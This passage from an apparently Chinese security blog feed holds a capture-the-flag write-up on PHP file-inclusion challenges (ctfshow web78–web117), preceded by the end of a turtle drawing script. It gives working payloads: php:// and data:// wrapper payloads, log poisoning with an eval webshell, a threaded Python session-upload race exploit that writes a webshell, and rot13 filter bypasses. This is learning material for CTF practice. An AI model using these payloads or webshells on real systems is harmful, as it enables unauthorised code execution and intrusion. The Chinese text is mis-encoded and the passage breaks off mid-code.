class="line">turtle.pencolor(&quot;brown&quot;)</span><br><span class="line">turtle.pensize(1)</span><br><span class="line">turtle.fillcolor(&quot;brown&quot;)</span><br><span class="line">turtle.begin_fill()</span><br><span class="line">turtle.pendown()</span><br><span class="line">turtle.setheading(36)</span><br><span class="line">turtle.circle(-8, 180)</span><br><span class="line">turtle.circle(-60, 24)</span><br><span class="line">turtle.setheading(110)</span><br><span class="line">turtle.circle(-60, 24)</span><br><span class="line">turtle.circle(-8, 180)</span><br><span class="line">turtle.end_fill()</span><br><span class="line"></span><br><span class="line"># äº”ç¯</span><br><span class="line">turtle.penup()</span><br><span class="line">turtle.goto(-5, -170)</span><br><span class="line">turtle.pendown()</span><br><span class="line">turtle.pencolor(&quot;blue&quot;)</span><br><span class="line">turtle.circle(6)</span><br><span class="line">turtle.penup()</span><br><span class="line">turtle.goto(10, -170)</span><br><span class="line">turtle.pendown()</span><br><span class="line">turtle.pencolor(&quot;black&quot;)</span><br><span class="line">turtle.circle(6)</span><br><span class="line">turtle.penup()</span><br><span class="line">turtle.goto(25, -170)</span><br><span class="line">turtle.pendown()</span><br><span class="line">turtle.pencolor(&quot;brown&quot;)</span><br><span class="line">turtle.circle(6)</span><br><span class="line">turtle.penup()</span><br><span class="line">turtle.goto(2, -175)</span><br><span class="line">turtle.pendown()</span><br><span class="line">turtle.pencolor(&quot;lightgoldenrod&quot;)</span><br><span class="line">turtle.circle(6)</span><br><span class="line">turtle.penup()</span><br><span class="line">turtle.goto(16, -175)</span><br><span class="line">turtle.pendown()</span><br><span class="line">turtle.pencolor(&quot;green&quot;)</span><br><span class="line">turtle.circle(6)</span><br><span class="line">turtle.penup()</span><br><span class="line"></span><br><span class="line">turtle.pencolor(&quot;black&quot;)</span><br><span class="line">turtle.goto(-16, -160)</span><br><span class="line">turtle.write(&quot;BEIJING 2022&quot;, font=(&#x27;Arial&#x27;, 10, &#x27;bold italic&#x27;))</span><br><span class="line">turtle.hideturtle()</span><br><span class="line"></span><br><span class="line">turtle.done()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;é€ä½ ä¸€ä¸ªå†°å¢©å¢©å“¦-turtle&quot;&gt;&lt;a href=&quot;#é€ä½ ä¸€ä¸ªå†°å¢©å¢©å“¦-turtle&quot; class=&quot;headerlink&quot; title=&quot;é€ä½ ä¸€ä¸ªå†°å¢©å¢©å“¦(turtle)~&quot;&gt;&lt;/a&gt;é€ä½ ä¸€ä¸ªå†°å¢©å¢©å“¦(turtle)~&lt;/h1&gt;&lt;p&gt;ä»Šå¤©åœ¨ç©ºé—´å‘äº†ä¸€ä¸ªè¯´è¯´ï¼Œæ˜¯ç”¨</summary>
      
    
    
    
    <category term="é—²èŠ" scheme="http://websec.space/categories/%E9%97%B2%E8%81%8A/"/>
    
    
    <category term="é—²èŠ" scheme="http://websec.space/tags/%E9%97%B2%E8%81%8A/"/>
    
  </entry>
  
  <entry>
    <title>ctfshowæ–‡ä»¶åŒ…å«</title>
    <link href="http://websec.space/2022/02/06/ctfshow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <id>http://websec.space/2022/02/06/ctfshow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</id>
    <published>2022-02-05T16:00:00.000Z</published>
    <updated>2022-02-06T15:58:20.551Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ctfshowæ–‡ä»¶åŒ…å«"><a href="#ctfshowæ–‡ä»¶åŒ…å«" class="headerlink" title="ctfshowæ–‡ä»¶åŒ…å«"></a>ctfshowæ–‡ä»¶åŒ…å«</h1><h2 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><h2 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>phpè¢«è¿‡æ»¤äº†ï¼Œä½¿ç”¨data://</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTsgPz4=</span><br></pre></td></tr></table></figure><h2 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿‡æ»¤äº†phpå’Œdataï¼Œä¸æ…Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">åŒ…å«æ—¥å¿—æ–‡ä»¶ è¿›è¡Œgetshell æ—¥å¿—æ–‡ä»¶è·¯å¾„ï¼š ?file=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure><p>é‡‡ç”¨UAä¼ å…¥ä¸€å¥è¯æœ¨é©¬</p><p>ç›´æ¥æ‰§è¡Œ</p><h2 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file);</span><br><span class="line">    include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ•…æŠ€é‡æ–½ï¼</p><p>ç¨å¾®æ”¹ä¸€ä¸‹ä¸€å¥è¯æœ¨é©¬çš„å¤´</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=eval($_POST[1]); ?&gt;</span><br></pre></td></tr></table></figure><h2 id="web82"><a href="#web82" class="headerlink" title="web82"></a>web82</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ²¡ç©è¿‡ï¼Œæ²¡æ€è·¯ï¼Œçˆªå·´       </p><p><a href="https://www.freebuf.com/news/202819.html">https://www.freebuf.com/news/202819.html</a></p><p>åˆ©ç”¨session.upload_progressè¿›è¡Œæ–‡ä»¶åŒ…å«</p><blockquote><ol><li><p>å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´</p></li><li><p>çŸ¥é“sessionæ–‡ä»¶å­˜æ”¾è·¯å¾„ï¼Œå¯ä»¥å°è¯•é»˜è®¤è·¯å¾„</p></li><li><p>å…·æœ‰è¯»å–å’Œå†™å…¥sessionæ–‡ä»¶çš„æƒé™</p></li></ol></blockquote><p>expï¼Œä½†æ˜¯ç°åœ¨å·²ç»ä¸èƒ½åšäº†å°±å†™å†™æ€è·¯:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import io</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line">url=&#x27;http://b1bd9036-7201-48cf-ae78-5a33fd906d85.challenge.ctf.show/&#x27;</span><br><span class="line">sessionid=&#x27;ctfshow&#x27;</span><br><span class="line">data=&#123;</span><br><span class="line">&quot;1&quot;:&quot;file_put_contents(&#x27;/var/www/html/2.php&#x27;,&#x27;&lt;?php eval($_POST[2]);?&gt;&#x27;);&quot;</span><br><span class="line">&#125;</span><br><span class="line">#&lt;?php eval($_POST[1]);?&gt;</span><br><span class="line">def write(session):</span><br><span class="line">fileBytes = io.BytesIO(b&#x27;a&#x27;*1024*50)</span><br><span class="line">while True:</span><br><span class="line">response=session.post(url,</span><br><span class="line">data=&#123;</span><br><span class="line">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;:&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span><br><span class="line">&#125;,</span><br><span class="line">cookies=&#123;</span><br><span class="line">&#x27;PHPSESSID&#x27;:sessionid</span><br><span class="line">&#125;,</span><br><span class="line">files=&#123;</span><br><span class="line">&#x27;file&#x27;:(&#x27;ctfshow.jpg&#x27;,fileBytes)</span><br><span class="line">&#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">def read(session):</span><br><span class="line">while True:</span><br><span class="line">response=session.post(url+&#x27;?file=/tmp/sess_&#x27;+sessionid,data=data,</span><br><span class="line">cookies=&#123;</span><br><span class="line">&#x27;PHPSESSID&#x27;:sessionid</span><br><span class="line">&#125;</span><br><span class="line">)</span><br><span class="line">resposne2=session.get(url+&#x27;2.php&#x27;);</span><br><span class="line">if resposne2.status_code==200:</span><br><span class="line">print(&#x27;++++++done++++++&#x27;)</span><br><span class="line">else:</span><br><span class="line">print(resposne2.status_code)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line"></span><br><span class="line">evnet=threading.Event()</span><br><span class="line">with requests.session() as session:</span><br><span class="line">for i in range(20):</span><br><span class="line">threading.Thread(target=write,args=(session,)).start()</span><br><span class="line">for i in range(20):</span><br><span class="line">threading.Thread(target=read,args=(session,)).start()</span><br><span class="line"></span><br><span class="line">evnet.set()</span><br></pre></td></tr></table></figure><h2 id="web83"><a href="#web83" class="headerlink" title="web83"></a>web83</h2><p>æ•…æŠ€é‡æ–½</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_unset();</span><br><span class="line">session_destroy();</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file);</span><br><span class="line"></span><br><span class="line">    include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="web84"><a href="#web84" class="headerlink" title="web84"></a>web84</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file);</span><br><span class="line">    system(&quot;rm -rf /tmp/*&quot;);</span><br><span class="line">    include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å› ä¸ºå¼€äº†å¤šçº¿ç¨‹ï¼Œ82çš„è„šæœ¬ä¾ç„¶ç®¡ç”¨ã€‚</p><h2 id="web85"><a href="#web85" class="headerlink" title="web85"></a>web85</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">if</span>(file_exists(<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="variable">$content</span> = file_get_contents(<span class="variable">$file</span>);</span><br><span class="line">        <span class="keyword">if</span>(strpos(<span class="variable">$content</span>, <span class="string">&quot;&lt;&quot;</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‹‰é«˜çº¿ç¨‹æ•°æ•…æŠ€é‡æ–½ï¼</p><p>æ­¤é¢˜æ˜¯è¯»ä¸€ä¸‹ï¼Œæ–‡ä»¶å†…å®¹ç„¶åï¼Œå¯¹æ–‡ä»¶å†…å®¹è¿›è¡Œåˆ¤æ–­ï¼Œåè¿›è¡ŒåŒ…å«</p><h2 id="web86"><a href="#web86" class="headerlink" title="web86"></a>web86</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">define(<span class="string">&#x27;è¿˜è¦ç§€ï¼Ÿ&#x27;</span>, dirname(<span class="keyword">__FILE__</span>));</span><br><span class="line">set_include_path(è¿˜è¦ç§€ï¼Ÿ);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é™åˆ¶äº†æ–‡ä»¶è·¯å¾„ï¼Œä½†ä¹‹å‰çš„æ–¹æ³•ä¾ç„¶å¯ä»¥ç”¨ã€‚</p><h2 id="web87"><a href="#web87" class="headerlink" title="web87"></a>web87</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    file_put_contents(urldecode(<span class="variable">$file</span>), <span class="string">&quot;&lt;?php die(&#x27;å¤§ä½¬åˆ«ç§€äº†&#x27;);?&gt;&quot;</span>.<span class="variable">$content</span>);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸é™¤å¤•å¤œçš„çº¢åŒ…é¢˜ç±»ä¼¼ï¼Œåªä¸è¿‡æŠŠä¸€ä¸ªå‚æ•°æ”¹æˆäº†ä¸¤ä¸ªéš¾åº¦å…¶å®æ˜¯å‡å°äº†ï¼Œå¹²è„†å¯¹æ¯”ä¸€ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">$content = $_GET[content];</span><br><span class="line">file_put_contents($content,&#x27;&lt;?php exit();&#x27;.$content);</span><br><span class="line">payloadï¼š</span><br><span class="line">content=php://filter/write=string.rot13|&lt;?cuc uvtuyvtug_svyr(&#x27;/synt.gkg&#x27;); ?&gt;/resource=shell.php</span><br></pre></td></tr></table></figure><p>åŸç†æ¯”è¾ƒç®€å•ï¼Œåˆ©ç”¨ä¸€ä¸ªåŠ å¯†ä¸è§£å¯†åŒæ ·çš„æ–¹æ³•ï¼Œæ‰€ä»¥ä½¿ç”¨å‡¯æ’’å¯†ç ï¼Œå°†æˆ‘ä»¬æƒ³ç”¨çš„ä¸œè¥¿ç•™ä¸‹ï¼Œå…¶ä½™çš„åŠ å¯†æˆä¹±ç ï¼Œåœ¨phpæ–‡ä»¶è§£ææ—¶ï¼Œä¼šæŠŠä»–ä»¬å½“æˆhtmlçš„å†…å®¹ï¼Œä»è€Œä¸æ‰§è¡Œã€‚</p><p>æ­¤å¤„åªéœ€è¦ï¼Œåœ¨å‰é¢åˆ©ç”¨æ–‡ä»¶åŒ…å«ï¼Œåé¢å†™å…¥æœ¨é©¬</p><p>payloadï¼šæ­¤å¤„ä¸ºäº†èƒ½å¤Ÿç»•è¿‡ï¼Œfileè¿›è¡Œäº†ä¸¤æ¬¡urlå…¨åŠ å¯†ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%37%33%25%37%34%25%37%32%25%36%39%25%36%65%25%36%37%25%32%65%25%37%32%25%36%66%25%37%34%25%33%31%25%33%33%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%37%33%25%36%38%25%36%35%25%36%63%25%36%63%25%32%65%25%37%30%25%36%38%25%37%30</span><br><span class="line">content=&lt;?cuc flfgrz(&#x27;gnp sy*.cuc&#x27;); ?&gt;</span><br></pre></td></tr></table></figure><h2 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    if(preg_match(&quot;/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i&quot;, $file))&#123;</span><br><span class="line">        die(&quot;error&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥ä½¿ç”¨ä¹‹å‰çš„è„šæœ¬ï¼Œæ²¡æœ‰è¿‡æ»¤dataï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨data://åè®®</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmwqJyk7ICA/PmFh</span><br></pre></td></tr></table></figure><h2 id="web116"><a href="#web116" class="headerlink" title="web116"></a>web116</h2><p>æ‰“å¼€æ˜¯ä¸ªè§†é¢‘ï¼Œçœ‹å‰ç«¯ä¹Ÿæ²¡çœ‹å‡ºæ¥æœ‰å•¥ä¸œè¥¿ã€‚ç”¨binwalkæ‰«äº†ä¸€ä¸‹åˆä¸€å¼ png</p><p>ç›´æ¥æå–</p><p><img src="https://img-blog.csdnimg.cn/b0cbc3ae48464d61ba1169f243f19703.png" alt="img"></p><p>åº·åº·å›¾ç‰‡</p><p><img src="https://img-blog.csdnimg.cn/4a1485367f4e43498e9d8676e351df82.png" alt="img"></p><p>åªèƒ½ç”¨php://filter</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=php://filter/resource=flag.php</span><br></pre></td></tr></table></figure><h2 id="web117"><a href="#web117" class="headerlink" title="web117"></a>web117</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i&#x27;</span>,<span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too 